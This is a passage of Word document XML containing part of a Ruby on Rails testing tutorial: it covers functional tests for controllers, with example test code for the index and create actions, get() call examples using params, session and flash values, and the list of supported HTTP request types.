        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B587D9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_template(expected = nil, message=nil)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0CD82524" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Asserts that the request was rendered with the appropriate template file.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64731C72" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You’ll see the usage of some of these assertions in the next chapter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F172DD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>4 Functional Tests for Your Controllers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27463E37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In Rails, testing the various actions of a single controller is called writing functional tests for that controller. Controllers handle the incoming web requests to your application and eventually respond with a rendered view.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCD84CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 What to Include in your Functional Tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="036C3E29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You should test for things such as:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A995946" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="314"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>was the web request successful?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1802BCFB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="314"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>was the user redirected to the right page?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C18A7E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="314"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>was the user successfully authenticated?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18EDFDAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="314"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>was the correct object stored in the response template?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D295E29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="314"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>was the appropriate message displayed to the user in the view?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370E5151" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now that we have used Rails scaffold generator for our </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> resource, it has already created the controller code and functional tests. You can take look at the file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>posts_controller_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/functional</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B52652C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Let me take you through one such test, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_should_get_index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>posts_controller_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="21079E63" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="63000D2B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test "should get index"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14060FB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  get :index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47952124" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_response :success</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F25371F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_not_nil assigns(:posts)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11C08053" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C53F237" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_should_get_index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> test, Rails simulates a request on the action called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, making sure the request was successful and also ensuring that it assigns a valid </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>posts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instance variable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7FEEEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method kicks off the web request and populates the results into the response. It accepts 4 arguments:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FE478C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="315"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The action of the controller you are requesting. This can be in the form of a string or a symbol.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370BC876" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="315"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>An optional hash of request parameters to pass into the action (eg. query string parameters or post variables).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A16216B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="315"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>An optional hash of session variables to pass along with the request.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0CFBD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="315"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>An optional hash of flash values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73250A4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Example: Calling the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:show</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> action, passing an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of 12 as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and setting a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>user_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of 5 in the session:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5135"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3AFF4631" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F08ADC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1157265587"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>get(:show, {'id'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "12"}, {'user_id'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 5})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E34A7BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another example: Calling the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:view</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> action, passing an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of 12 as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r>
        <w:t>, this time with no session, but with a flash message.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6575"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0C12A4FC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75139A48" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="433139167"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>get(:view, {'id'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '12'}, nil, {'message'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'booya!'})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42500F85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you try running </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_should_create_post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> test from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>posts_controller_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it will fail on account of the newly added model level validation and rightly so.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14702F18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Let us modify </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_should_create_post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> test in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>posts_controller_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so that all our test pass:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6575"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="179DD38A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2ECB7407" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test "should create post"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E2EEEE2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_difference('Post.count') do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="798F32BC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    post :create, :post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; { :title</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Some title'}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="059A3FF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09940541" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E9A3607" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_redirected_to post_path(assigns(:post))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D1772D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1CC90D68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Now you can try running all the tests and they should pass.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68141211" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Available Request Types for Functional Tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6505F45C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you’re familiar with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> protocol, you’ll know that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a type of request. There are 6 request types supported in Rails functional tests:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307C53A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="316"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA0F1AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="316"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35643771" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="316"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>patch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AFA95D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="316"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>put</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E014148" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="316"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21324199" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="316"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
    </w:p>
